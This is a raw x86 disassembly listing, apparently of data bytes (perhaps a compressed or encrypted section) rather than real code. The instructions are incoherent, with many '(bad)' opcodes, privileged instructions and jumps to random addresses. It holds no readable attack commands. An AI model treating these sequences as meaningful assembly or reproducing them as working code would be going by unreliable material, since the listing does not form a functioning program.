  4242f9:	mov    ebx,0x53829162
  4242fe:	sbb    BYTE PTR [esi+0x19],bl
  424301:	lock (bad) [edi-0x7b]
  424305:	jecxz  0x424312
  424307:	adc    BYTE PTR [esp+esi*8-0x74],ah
  42430b:	push   ecx
  42430c:	cmc    
  42430d:	rcl    BYTE PTR [ecx+0x6b],0x23
  424311:	loope  0x424301
  424313:	test   DWORD PTR [esi],0x21537d
  424319:	into   
  42431a:	xchg   DWORD PTR [ecx+ebx*2],esi
  42431d:	adc    DWORD PTR [edi+0x79],ebp
  424320:	fild   DWORD PTR ds:0x224afaca
  424326:	mov    esi,esp
  424328:	(bad)  
  424329:	ret    0x724a
  42432c:	out    dx,eax
  42432d:	je     0x42431e
  42432f:	mov    al,ds:0x750478f5
  424334:	aas    
  424335:	cld    
  424336:	jmp    0x4f3c09e7
  42433b:	lahf   
  42433c:	mov    esp,0x5ff4b335
  424341:	jnp    0x4242d5
  424343:	fmul   DWORD PTR [ebx-0x39]
  424346:	cs inc edx
  424348:	icebp  
  424349:	pop    edi
  42434a:	sbb    al,0x44
  42434c:	es test al,0xa4
  42434f:	(bad)  
  424350:	outs   dx,DWORD PTR ds:[esi]
  424351:	in     al,0x33
  424353:	loope  0x424362
  424355:	push   DWORD PTR [esi-0x38]
  424358:	and    bh,BYTE PTR [eax-0x71]
  42435b:	cmp    BYTE PTR [ebp-0x79168404],al
  424361:	das    
  424362:	mov    ds:0x19a7da82,al
  424367:	mov    ebx,0x4a5faa85
  42436c:	mov    bl,0xd6
  42436e:	bound  edi,QWORD PTR [eax]
  424370:	push   ss
  424371:	xor    ch,BYTE PTR [edx+0x66d93c86]
  424377:	bound  esp,QWORD PTR [edx-0x3e34efd8]
  42437d:	(bad)  
  42437e:	sti    
  42437f:	ins    BYTE PTR es:[edi],dx
  424380:	add    esi,esi
  424382:	mov    eax,ds:0x62c63b46
  424387:	repz sub bh,cl
  42438a:	xchg   esp,eax
  42438b:	cmp    DWORD PTR [edx+edx*4-0x3b],eax
  42438f:	sbb    ah,BYTE PTR [ecx-0x3bf195b9]
  424395:	inc    esi
  424396:	test   DWORD PTR [eax+edx*2],edi
  424399:	dec    ebp
  42439a:	mov    bh,0x1e
  42439c:	repz push esp
  42439e:	sbb    DWORD PTR [edi],0x4c
  4243a1:	aad    0x8
  4243a3:	adc    DWORD PTR [esi+0x1024d467],edx
  4243a9:	or     DWORD PTR [esi],ecx
  4243ab:	pop    edi
  4243ac:	stc    
  4243ad:	js     0x4243a2
  4243af:	arpl   WORD PTR [edx+0x15c27b14],bx
  4243b5:	iret   
  4243b6:	and    al,0x85
  4243b8:	mov    ebp,esp
  4243ba:	jge    0x424395
  4243bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243bd:	push   esi
  4243be:	xor    ah,ah
  4243c0:	pop    edx
  4243c1:	cwde   
  4243c2:	mov    ecx,0xa93edbef
  4243c7:	or     al,0x26
  4243c9:	adc    bh,BYTE PTR [esi+0x3b]
  4243cc:	lds    edx,FWORD PTR [ebx]
  4243ce:	sub    dh,ah
  4243d0:	add    al,0x69
  4243d2:	xchg   esp,eax
  4243d3:	mov    WORD PTR [edx-0x4a],ds
  4243d6:	jg     0x424414
  4243d8:	add    DWORD PTR [ebp-0x747e612d],eax
  4243de:	pusha  
  4243df:	imul   ebx,DWORD PTR [ebp+0x43],0xffffff9c
  4243e3:	in     eax,dx
  4243e4:	mov    ds:0xbcf7bb7b,eax
  4243e9:	fnstenv [ecx]
  4243eb:	mov    ch,0x1d
  4243ed:	mov    ebx,0x0
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424493
  424463:	and    BYTE PTR [ebp-0x50],dh
  424466:	test   DWORD PTR [bx+di],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [eax],dh
  42446f:	fs mov al,0xf1
  424472:	push   ebx
  424473:	xor    esp,DWORD PTR ds:0x592698f6
  424479:	lock push esp
  42447b:	push   ss
  42447c:	pop    ebx
  42447d:	xchg   edi,eax
  42447e:	mov    bh,0x9d
  424480:	inc    esi
  424481:	inc    eax
  424482:	out    0x5b,eax
  424484:	test   al,0xf4
  424486:	mov    eax,ds:0x1886f914
  42448b:	cmp    BYTE PTR [eax],cl
  42448d:	push   edx
  42448e:	fdiv   st,st(6)
  424490:	lea    esp,[edx+eax*2+0x6a]
  424494:	sub    DWORD PTR [esi-0x5949769c],ebx
  42449a:	shr    DWORD PTR [ebp-0x2271cbd6],1
  4244a0:	cmp    eax,0xed8c89e
  4244a5:	into   
  4244a6:	loope  0x4244a9
  4244a8:	stos   BYTE PTR es:[edi],al
  4244a9:	adc    BYTE PTR [ecx+0x8002dfb],ah
  4244af:	stc    
  4244b0:	into   
  4244b1:	push   0x5f
  4244b3:	and    bl,BYTE PTR [edx]
  4244b5:	push   ebx
  4244b6:	jnp    0x4244d9
  4244b8:	js     0x424525
  4244ba:	cmp    eax,0x7f627791
  4244bf:	pop    edx
  4244c0:	sub    BYTE PTR [ebp+0x2847b4d9],0x1e
  4244c7:	stos   BYTE PTR es:[edi],al
  4244c8:	lock xchg edi,eax
  4244ca:	adc    DWORD PTR [eax-0x41],ebp
  4244cd:	std    
  4244ce:	repnz clc 
  4244d0:	ret    
  4244d1:	xor    DWORD PTR [eax],ebx
  4244d3:	pop    edx
  4244d4:	stc    
  4244d5:	mov    cl,0xa3
  4244d7:	pop    edi
  4244d8:	mov    ah,0x6b
  4244da:	mov    eax,ds:0xd738d205
  4244df:	data16 loope 0x42453b
  4244e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244e3:	jmp    0x5b24:0xc6b896d7
  4244ea:	(bad)
  4244ed:	xchg   edx,eax
  4244ee:	or     cl,dl
  4244f0:	mov    DWORD PTR [edi],0xfd4b15c2
  4244f6:	iret   
  4244f7:	xor    al,0x57
  4244f9:	pop    edi
  4244fa:	cmp    BYTE PTR [ecx-0x68],0x4a
  4244fe:	not    BYTE PTR [esi-0x70cbe26e]
  424504:	aam    0xf4
  424506:	and    DWORD PTR [eax+0x2b],esp
  424509:	jnp    0x42449f
  42450b:	idiv   bh
  42450d:	(bad)  
  42450e:	stos   BYTE PTR es:[edi],al
  42450f:	add    BYTE PTR [ecx+0x45],cl
  424512:	and    dh,ch
  424514:	xor    dh,dl
  424516:	and    BYTE PTR [esi+0x56],dh
  424519:	mov    WORD PTR [edx+ecx*2-0x2e1ccd18],fs
  424520:	fisub  DWORD PTR [edi-0x7b]
  424523:	fisubr DWORD PTR [esi-0x7d]
  424526:	jns    0x424529
  424528:	jge    0x42457a
  42452a:	add    BYTE PTR [eax+0x7b],bl
  42452d:	test   DWORD PTR [eax],ebp
  42452f:	daa    
  424530:	pusha  
  424531:	shl    DWORD PTR [ebp-0x6bc79fa9],0x17
  424538:	xchg   edi,eax
  424539:	mov    eax,ds:0x49175250
  42453e:	push   edx
  42453f:	and    BYTE PTR [eax],bl
  424541:	sahf   
  424542:	hlt    
  424543:	outs   dx,BYTE PTR ds:[esi]
  424544:	mov    al,0xfd
  424546:	cmc    
  424547:	inc    eax
  424548:	or     DWORD PTR [edx-0x21f59ca3],ecx
  42454e:	xchg   ebx,eax
  42454f:	dec    eax
  424550:	dec    ebp
  424551:	and    BYTE PTR [edi+0x3a],0x55
  424555:	mov    ebx,0x7e609adb
  42455a:	mov    DWORD PTR [ebp+0x42],0x8515625
  424561:	add    al,0xe
  424563:	dec    edx
  424564:	repnz add edx,DWORD PTR ds:0x67f07a06
  42456b:	cdq    
  42456c:	cmp    bh,BYTE PTR [edi+0x0]
	...
  4245d6:	loopne 0x424647
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4+0x19],1
  4245e3:	call   DWORD PTR [eax+eax*8+0x18667]
  4245ea:	add    BYTE PTR [ecx],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	mov    bl,0xc0
  4245f0:	in     eax,0xb2
  4245f2:	inc    edx
  4245f3:	(bad)  
  4245f4:	xor    al,0xbb
  4245f6:	rol    DWORD PTR [esi+0x6e28a31f],1
  4245fc:	adc    esp,DWORD PTR [ecx+edx*2+0x603a3886]
  424603:	sub    al,0x3
  424605:	inc    esi
  424606:	xlat   BYTE PTR ds:[ebx]
  424607:	lds    ebx,FWORD PTR [ecx-0x2796b651]
  42460d:	xor    ebx,ecx
  42460f:	call   0x2b63:0x93bbcd26
  424616:	adc    al,0x1c
  424618:	dec    ebx
  424619:	or     al,0xce
  42461b:	fiadd  WORD PTR [ebp+0x25]
  42461e:	cld    
  42461f:	nop
  424620:	sar    DWORD PTR [eax+esi*2+0x10],0xca
  424625:	aas    
  424626:	cld    
  424627:	sub    DWORD PTR [eax],edi
  424629:	jmp    0x9e3bf770
  42462e:	pop    edi
  42462f:	(bad)  
  424630:	stos   DWORD PTR es:[edi],eax
  424631:	sub    esp,0x65
  424634:	inc    BYTE PTR [ecx+0x3de0f85c]
  42463a:	dec    eax
  42463b:	sub    dh,cl
  42463d:	sbb    al,0x2d
  42463f:	(bad)  
  424641:	xor    BYTE PTR [ecx-0x10],0x80
  424645:	lods   al,BYTE PTR ds:[esi]
  424646:	repz mov al,ds:0x6d6663e8
  42464c:	in     eax,0x7c
  42464e:	push   ebx
  42464f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424650:	cmp    BYTE PTR [esi+0x40],cl
  424653:	pushf  
  424654:	rcr    BYTE PTR [edi+0x59889c5e],1
  42465a:	mov    BYTE PTR [edx],0x23
  42465d:	(bad)  
  42465e:	adc    eax,ecx
  424660:	ss push esp
  424662:	clc    
  424663:	mov    DWORD PTR [ebx],0x947c7d87
  424669:	jno    0x42465c
  42466b:	adc    al,0x7d
  42466d:	sbb    cl,BYTE PTR [ecx+0x5bf47603]
  424673:	mov    dh,BYTE PTR [esi]
  424675:	ss mov dl,0xad
  424678:	mov    BYTE PTR [eax],dl
  42467a:	xor    ah,BYTE PTR [ecx]
  42467c:	mov    ebx,0x15a07c1b
  424681:	xor    edi,ebp
  424683:	or     cl,BYTE PTR [ebx]
  424685:	and    BYTE PTR [edx+0x47a250f8],dl
  42468b:	test   cl,dh
  42468d:	xor    DWORD PTR [ebx+0x73],eax
  424690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424691:	mov    BYTE PTR [esi],0xbe
  424694:	mov    dl,0x3e
  424696:	test   DWORD PTR [eax+0x5d],0xb274729
  42469d:	addr16 pop edx
  42469f:	push   cs
  4246a0:	loope  0x4246b4
  4246a2:	add    al,BYTE PTR [edx-0x161139af]
  4246a8:	mov    cl,0xd8
  4246aa:	jl     0x424631
  4246ac:	adc    BYTE PTR [esi],dh
  4246ae:	je     0x424635
  4246b0:	fild   QWORD PTR [ebx]
  4246b2:	call   0x160af61a
  4246b7:	pop    ss
  4246b8:	stos   BYTE PTR es:[di],al
  4246ba:	mov    DWORD PTR [edx+0x2a],ebp
  4246bd:	fucomip st,st(2)
  4246bf:	je     0x424710
  4246c1:	js     0x42465c
  4246c3:	cs mov ebp,0xadb0d1a1
  4246c9:	jb     0x42470c
  4246cb:	scas   eax,DWORD PTR es:[edi]
  4246cc:	and    BYTE PTR [eax+0x1b],bl
  4246cf:	adc    edx,esp
  4246d1:	fild   QWORD PTR [ecx]
  4246d3:	addr16 mov al,0xe3
  4246d6:	xchg   ebp,eax
  4246d7:	popa   
  4246d8:	fcmovu st,st(5)
  4246da:	sub    BYTE PTR [ebx],0xf1
  4246dd:	shl    BYTE PTR [ecx],1
  4246df:	sti    
  4246e0:	pop    ebx
  4246e1:	mov    dh,0x34
  4246e3:	sub    BYTE PTR es:[edx+0x76],dl
  4246e7:	xchg   ebx,eax
  4246e8:	leave  
  4246e9:	xchg   esp,eax
  4246ea:	dec    eax
  4246eb:	outs   dx,BYTE PTR ds:[esi]
  4246ec:	lock jle 0x4246ef
	...
  424753:	add    BYTE PTR [eax],al
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [ebp+0x67fc0a97],cl
  424767:	xchg   DWORD PTR [ecx],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [eax],ah
  42476f:	add    ecx,esp
  424771:	scas   eax,DWORD PTR es:[edi]
  424772:	jle    0x42474c
  424774:	push   ebx
  424775:	or     bh,BYTE PTR [esi+eiz*8-0x19ea03cf]
  42477c:	outs   dx,DWORD PTR ds:[esi]
  42477d:	mov    ?,WORD PTR [esp+edi*8]
  424780:	lahf   
  424781:	dec    edx
  424782:	xchg   edx,eax
  424783:	mov    dh,0xd6
  424785:	addr16 fdivr st,st(5)
  424788:	and    BYTE PTR [edx],bl
  42478a:	bound  ecx,QWORD PTR [ecx+0x20d28fca]
  424790:	xchg   DWORD PTR [ebp-0x2a],edx
  424793:	mov    ebx,0x2d87fb8c
  424798:	and    eax,0xef89e289
  42479d:	jmp    0x34efdc76
  4247a2:	rol    DWORD PTR [ebp-0x7a0a9d7e],cl
  4247a8:	lahf   
  4247a9:	add    BYTE PTR [edx+0xc4c07e4],cl
  4247af:	jmp    0x42474e
  4247b1:	and    ecx,esi
  4247b3:	je     0x424757
  4247b5:	jle    0x424741
  4247b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247b8:	xor    ch,cl
  4247ba:	jp     0x4247d5
  4247bc:	push   ebx
  4247bd:	pushf  
  4247be:	jbe    0x4247a7
  4247c0:	mov    esi,0xc7bd59b3
  4247c5:	mov    cs,ecx
  4247c7:	push   eax
  4247c8:	fadd   DWORD PTR [edx+0x19]
  4247cb:	inc    esp
  4247cc:	pop    ecx
  4247cd:	mov    edx,0xbf51ca1
  4247d2:	cmp    DWORD PTR [ebx-0x25],edx
  4247d5:	ins    BYTE PTR es:[edi],dx
  4247d6:	arpl   dx,cx
  4247d8:	test   BYTE PTR ds:0x1ff765cb,ch
  4247de:	test   ch,bl
  4247e0:	mov    al,ds:0xe912753
  4247e5:	pop    edi
  4247e6:	add    BYTE PTR [ebx+0x1d5c1730],ch
  4247ec:	dec    edi
  4247ed:	in     eax,dx
  4247ee:	add    dh,BYTE PTR [ebx+ecx*8-0x64]
  4247f2:	enter  0x4f99,0xc3
  4247f6:	das    
  4247f7:	dec    ecx
  4247f8:	clc    
  4247f9:	test   eax,0x25b1a1bd
  4247fe:	bound  ebp,QWORD PTR [ecx+0x1972531b]
  424804:	sti    
  424805:	push   cs
  424806:	mov    esi,0x845c068b
  42480b:	mov    eax,0x595f8268
  424810:	adc    BYTE PTR [ebp+0x5ca7e1eb],bh
  424816:	mov    ch,BYTE PTR [ecx]
  424818:	icebp  
  424819:	or     ebp,DWORD PTR [edi]
  42481b:	data16 fisub WORD PTR [ecx]
  42481e:	adc    ecx,DWORD PTR [ebx+0x15c1229a]
  424824:	test   al,0x8b
  424826:	std    
  424827:	sbb    eax,DWORD PTR [eax]
  424829:	out    0x22,al
  42482b:	and    al,BYTE PTR [ecx+0x25]
  42482e:	pushf  
  42482f:	jecxz  0x42485f
  424831:	and    BYTE PTR [edi],dl
  424833:	xchg   edx,eax
  424834:	and    al,0x8f
  424836:	jg     0x424881
  424838:	ins    DWORD PTR es:[edi],dx
  424839:	daa    
  42483a:	mov    esp,0x2ca5c101
  42483f:	iret   
  424840:	std    
  424841:	mov    dl,0xef
  424843:	add    al,0x3
  424845:	sbb    BYTE PTR [ebx],0x1c
  424848:	cdq    
  424849:	pop    esp
  42484a:	lea    esp,[eax+0x4]
  42484d:	cmp    dl,BYTE PTR [esi-0x80]
  424850:	iret   
  424851:	(bad)
  424855:	scas   al,BYTE PTR es:[edi]
  424856:	adc    al,0xf9
  424858:	(bad)  
  424859:	adc    ebp,DWORD PTR ds:0x774302e0
  42485f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  424861:	jg     0x424821
  424863:	sbb    DWORD PTR [esi+edx*4+0x27],ebx
  424867:	int    0x3b
  424869:	pop    es
  42486a:	mov    BYTE PTR ds:0x343f,0x0
	...
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	not    BYTE PTR [eax-0x77980332]
  4248e8:	add    DWORD PTR [eax],eax
  4248ea:	add    BYTE PTR [ecx],al
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	call   0xa1ca:0xa7d4e5f3
  4248f5:	sub    esi,DWORD PTR [eax+0x736aa86c]
  4248fb:	fisub  DWORD PTR [edi+0x3f]
  4248fe:	xor    DWORD PTR [esi],eax
  424900:	ja     0x424902
  424902:	daa    
  424903:	mov    al,0xa0
  424905:	mov    ?,WORD PTR [edi+0x28b66fa4]
  42490b:	xchg   edx,eax
  42490c:	aad    0xa2
  42490e:	dec    ebx
  42490f:	or     cl,BYTE PTR [esi]
  424911:	retf   0xd718
  424914:	jne    0x42497e
  424916:	setbe  BYTE PTR [ebp*2-0x16d89c62]
  42491e:	and    ecx,DWORD PTR [edi+esi*8-0x50a888ec]
  424925:	div    BYTE PTR [eax-0x35]
  424928:	mov    bl,BYTE PTR [ecx-0x32]
  42492b:	imul   ecx,DWORD PTR [esi],0xffffffed
  42492e:	sub    eax,0x9ae68af9
  424933:	jl     0x42499f
  424935:	inc    ebp
  424936:	retf   0x9bf2
  424939:	sub    ch,0xc5
  42493c:	cwde   
  42493d:	iret   
  42493e:	and    DWORD PTR [ebx+ebx*4],0x93205f25
  424945:	arpl   WORD PTR [ebp+0xdd25dcd],si
  42494b:	adc    edi,0xf3c82509
  424951:	xor    DWORD PTR [esi+esi*4+0x6e6cdf94],0x778ca31a
  42495c:	mov    bh,0x3f
  42495e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42495f:	push   0x1f18b99e
  424964:	mov    bh,0x56
  424966:	and    ebx,DWORD PTR [edi-0x74]
  424969:	adc    DWORD PTR ds:0x2a2a839c,0x41
  424970:	ficomp WORD PTR [ebx+0x3f]
  424973:	mov    ebx,0xb3ce29f
  424978:	push   eax
  424979:	sub    eax,0xf60ede1e
  42497e:	popa   
  42497f:	retf   0xf5bb
  424982:	or     ch,cl
  424984:	mov    es:0x44a9af9e,al
  42498a:	sub    cl,BYTE PTR [ebx+0x4c]
  42498d:	rcl    DWORD PTR [edx+ebp*4-0x2c36d5be],1
  424994:	or     eax,0x6768c15d
  424999:	inc    ebp
  42499a:	outs   dx,BYTE PTR ds:[esi]
  42499b:	stc    
  42499c:	add    eax,0x964e8a8b
  4249a1:	pop    DWORD PTR [edx+0x415635bb]
  4249a7:	aam    0xc4
  4249a9:	xor    eax,0x218b02dd
  4249ae:	stc    
  4249af:	add    bh,BYTE PTR [edx-0x2ad8173c]
  4249b5:	jnp    0x424990
  4249b7:	or     ch,BYTE PTR [eax+0x755df93b]
  4249bd:	mov    ebx,0xe9cbea18
  4249c2:	mov    eax,ds:0x7efc091c
  4249c7:	xor    eax,0x9510d6b5
  4249cc:	call   0x94ec33f1
  4249d1:	xchg   BYTE PTR [ebx],cl
  4249d3:	sahf   
  4249d4:	shr    DWORD PTR [esi+0x6c],0x42
  4249d8:	mov    ch,0xb5
  4249da:	sub    bl,BYTE PTR ds:0x7049505
  4249e0:	fstp   QWORD PTR [edx-0x7def44fd]
  4249e6:	xor    BYTE PTR [ebx+0x758ac34],dl
  4249ec:	arpl   WORD PTR [eax+0x0],cx
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    cl,BYTE PTR [ebp+0x67bd7683]
  424a67:	mov    DWORD PTR [ecx],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    BYTE PTR [edx-0x6f],ah
  424a70:	ror    BYTE PTR [edx+ebp*1-0x78d163dc],cl
  424a77:	or     DWORD PTR [eax+0x193faaa4],0x965716ee
  424a81:	mov    esp,0xf2c826fe
  424a86:	gs fcomip st,st(4)
  424a89:	pop    ss
  424a8a:	out    dx,al
  424a8b:	add    eax,0x537c9f1
  424a90:	sub    ah,BYTE PTR [ebp+eiz*2+0x22]
  424a94:	aas    
  424a95:	fisub  WORD PTR [ebx+0x1e298a19]
  424a9b:	cmp    eax,0x8cddf81e
  424aa0:	data16 xor al,0x1c
  424aa3:	mov    ah,0x6d
  424aa5:	and    edx,DWORD PTR [edi]
  424aa7:	outs   dx,BYTE PTR ds:[esi]
  424aa8:	cld    
  424aa9:	scas   al,BYTE PTR es:[edi]
  424aaa:	scas   al,BYTE PTR es:[edi]
  424aab:	clc    
  424aac:	std    
  424aad:	int3   
  424aae:	pop    ecx
  424aaf:	jecxz  0x424aae
  424ab1:	pop    edx
  424ab2:	inc    edx
  424ab3:	test   BYTE PTR [esi+esi*8-0x3ed70730],bl
  424aba:	daa    
  424abb:	pop    edi
  424abc:	fnstsw WORD PTR [edi+0x69c2fe65]
  424ac2:	icebp  
  424ac3:	xlat   BYTE PTR ds:[ebx]
  424ac4:	mov    al,0x2e
  424ac6:	pop    edi
  424ac7:	daa    
  424ac8:	cmc    
  424ac9:	addr16 xchg edx,eax
  424acb:	fild   QWORD PTR [edx+ebp*4+0x4b2fe60b]
  424ad2:	jp     0x424b1e
  424ad4:	and    eax,0x5f19ff11
  424ad9:	dec    edi
  424ada:	test   DWORD PTR [eax],ecx
  424adc:	popf   
  424add:	mul    DWORD PTR [esi+ecx*8-0x1bb22d4]
  424ae4:	retf   
  424ae5:	repz jl 0x424b32
  424ae8:	jae    0x424aa4
  424aea:	mov    al,0x4b
  424aec:	popf   
  424aed:	jle    0x424ab2
  424aef:	cli    
  424af0:	in     al,dx
  424af1:	jo     0x424b1d
  424af3:	iret   
  424af4:	and    DWORD PTR [ebx-0x202056df],ebp
  424afa:	adc    al,0x40
  424afc:	sub    BYTE PTR [edx+0x74682769],ah
  424b02:	inc    esp
  424b03:	jmp    0x3dd1:0x1cecff15
  424b0a:	repz (bad) 
  424b0c:	scas   eax,DWORD PTR es:[edi]
  424b0d:	push   esi
  424b0e:	jle    0x424b57
  424b10:	sbb    eax,esi
  424b12:	aas    
  424b13:	sbb    ebp,DWORD PTR ds:0x87e54608
  424b19:	aaa    
  424b1a:	cwde   
  424b1b:	ss aam 0x86
  424b1e:	sub    al,0x89
  424b20:	nop
  424b21:	jge    0x424ae3
  424b23:	repnz xchg esi,eax
  424b25:	push   es
  424b26:	jne    0x424b1d
  424b28:	add    ebx,DWORD PTR [ecx+0x642cab1c]
  424b2e:	lea    esi,[eax-0x4663c27d]
  424b34:	inc    ecx
  424b35:	push   eax
  424b36:	mov    ch,0x8b
  424b38:	aam    0x2f
  424b3a:	rcl    DWORD PTR [ebp*4+0x5b822c9],1
  424b41:	int    0xa8
  424b43:	call   0x275:0x1719c9fe
  424b4a:	sub    al,0xd3
  424b4c:	adc    ch,BYTE PTR [ecx-0x4f]
  424b4f:	sub    al,0xde
  424b51:	sub    BYTE PTR [edi],dl
  424b53:	push   edi
  424b54:	repnz mov ch,BYTE PTR ds:0x73f1bdff
  424b5b:	jmp    0x424afa
  424b5d:	je     0x424b62
  424b5f:	sub    eax,0x4d8cc105
  424b64:	cmp    esp,DWORD PTR [ebx+ebp*8-0x12]
  424b68:	rcr    BYTE PTR [ebp+0x2d],cl
  424b6b:	cmc    
  424b6c:	mov    ecx,0xdd
	...
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	or     ecx,edi
  424be4:	mov    edi,0x18a6764
  424be9:	add    BYTE PTR [eax],al
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    BYTE PTR [ebp+0x284ee783],cl
  424bf3:	mov    ecx,0x610d539a
  424bf8:	bound  esp,QWORD PTR [ebx+0x1f9d6c05]
  424bfe:	rcl    eax,1
  424c00:	loopne 0x424bd2
  424c02:	push   eax
  424c03:	in     eax,dx
  424c04:	dec    ebx
  424c05:	or     DWORD PTR [ecx],ecx
  424c07:	cmp    al,0x7e
  424c09:	or     bl,0x61
  424c0c:	loop   0x424c2a
  424c0e:	adc    ebp,edx
  424c10:	jle    0x424c0b
  424c12:	jo     0x424bde
  424c14:	dec    eax
  424c15:	xor    ecx,DWORD PTR [ecx-0x379c1f51]
  424c1b:	call   0x9b9eda72
  424c20:	(bad)  
  424c21:	sub    bl,al
  424c23:	(bad)  
  424c24:	adc    bl,ah
  424c26:	imul   DWORD PTR [eax-0x4f]
  424c29:	ss mov ebp,0xd4ad3858
  424c2f:	fild   DWORD PTR [ebp-0x70815bcf]
  424c35:	cwde   
  424c36:	shr    DWORD PTR [ecx+0x7c],0xfe
  424c3a:	adc    ebp,esi
  424c3c:	push   ebp
  424c3d:	fwait
  424c3e:	(bad)  
  424c3f:	lock pop eax
  424c41:	pushf  
  424c42:	mov    WORD PTR [edx-0x51],?
  424c45:	sub    al,0x92
  424c47:	iret   
  424c48:	cdq    
  424c49:	xor    BYTE PTR [edi-0x59],ch
  424c4c:	stos   BYTE PTR es:[edi],al
  424c4d:	je     0x424cb4
  424c4f:	mov    ds:0xbaf55fbb,al
  424c54:	mov    bl,0xe6
  424c56:	aaa    
  424c57:	and    DWORD PTR [eax-0x393cf304],ebx
  424c5d:	xor    dl,BYTE PTR [ebx]
  424c5f:	push   ebx
  424c60:	scas   eax,DWORD PTR es:[edi]
  424c61:	add    esi,DWORD PTR [esi+0x6e75fabf]
  424c67:	test   eax,0x40674848
  424c6c:	mov    ebx,0x2bee2db3
  424c71:	pop    ecx
  424c72:	mov    ah,0x68
  424c74:	je     0x424c74
  424c76:	xor    al,0x5f
  424c78:	test   DWORD PTR [edx+0x6],ecx
  424c7b:	ret    
  424c7c:	je     0x424c56
  424c7e:	test   DWORD PTR [edi],0xd19bc800
  424c84:	paddsb mm1,QWORD PTR [esi]
  424c87:	mov    edi,0xad39ff5d
  424c8c:	(bad)  
  424c8d:	in     eax,0x19
  424c8f:	adc    BYTE PTR [edi],bl
  424c91:	mov    eax,0x4104a106
  424c96:	ror    BYTE PTR [esi+0x51],1
  424c99:	inc    eax
  424c9a:	scas   al,BYTE PTR es:[edi]
  424c9b:	adc    BYTE PTR [ebx+0x3b],0x86
  424c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ca0:	dec    DWORD PTR [ebx+edx*4]
  424ca3:	pop    eax
  424ca4:	jnp    0x424c9b
  424ca6:	xchg   esp,eax
  424ca7:	push   ebp
  424ca8:	iret   
  424ca9:	fwait
  424caa:	jecxz  0x424d0b
  424cac:	push   ds
  424cad:	icebp  
  424cae:	mov    ebp,ebx
  424cb0:	inc    esi
  424cb1:	inc    edi
  424cb2:	jp     0x424c83
  424cb4:	jp     0x424ca1
  424cb6:	pop    es
  424cb7:	jne    0x424c84
  424cb9:	test   DWORD PTR [ecx],ebp
  424cbb:	mov    bh,0x86
  424cbd:	xlat   BYTE PTR ds:[ebx]
  424cbe:	je     0x424c77
  424cc0:	jge    0x424c5a
  424cc2:	mov    WORD PTR [esi],bx
  424cc5:	daa    
  424cc6:	sbb    ebp,DWORD PTR [eax-0x16]
  424cc9:	pushf  
  424cca:	rcr    BYTE PTR [esi-0x4f4b410e],1
  424cd0:	inc    esi
  424cd1:	mov    ds:0x9cd1825,al
  424cd6:	test   BYTE PTR [ecx+0x7b],bh
  424cd9:	mov    ds,ebx
  424cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cdc:	pop    ebp
  424cdd:	jmp    0x424d00
  424cdf:	or     al,0x46
  424ce1:	adc    eax,0xec709e74
  424ce6:	jno    0x424d63
  424ce8:	pop    ss
  424ce9:	mov    edx,0x7e937b33
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0xe551a8]
  424d64:	xor    al,0xf
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    dl,ch
  424d6f:	xor    dl,BYTE PTR [ecx+0x724cf275]
  424d75:	sbb    BYTE PTR [ecx],cl
  424d77:	dec    ebp
  424d78:	ins    DWORD PTR es:[edi],dx
  424d79:	scas   al,BYTE PTR es:[edi]
  424d7a:	not    BYTE PTR [edx-0x6e586d3d]
  424d80:	mov    bh,0x41
  424d82:	shr    DWORD PTR [ebx+0x3e6eb169],1
  424d88:	inc    ebp
  424d89:	test   DWORD PTR [edx+0x41ce9de9],ebp
  424d8f:	sub    al,0xc4
  424d91:	dec    ebp
  424d92:	cmc    
  424d93:	xor    ecx,eax
  424d95:	imul   edx,ebp,0xc12352dc
  424d9b:	push   fs
  424d9d:	pop    eax
  424d9e:	addr16 out 0xa1,al
  424da1:	hlt    
  424da2:	cmp    DWORD PTR gs:[edi-0x1d03729e],eax
  424da9:	dec    edx
  424daa:	std    
  424dab:	xor    esp,DWORD PTR [ebx]
  424dad:	ins    BYTE PTR es:[edi],dx
  424dae:	wbinvd 
  424db0:	fs push esp
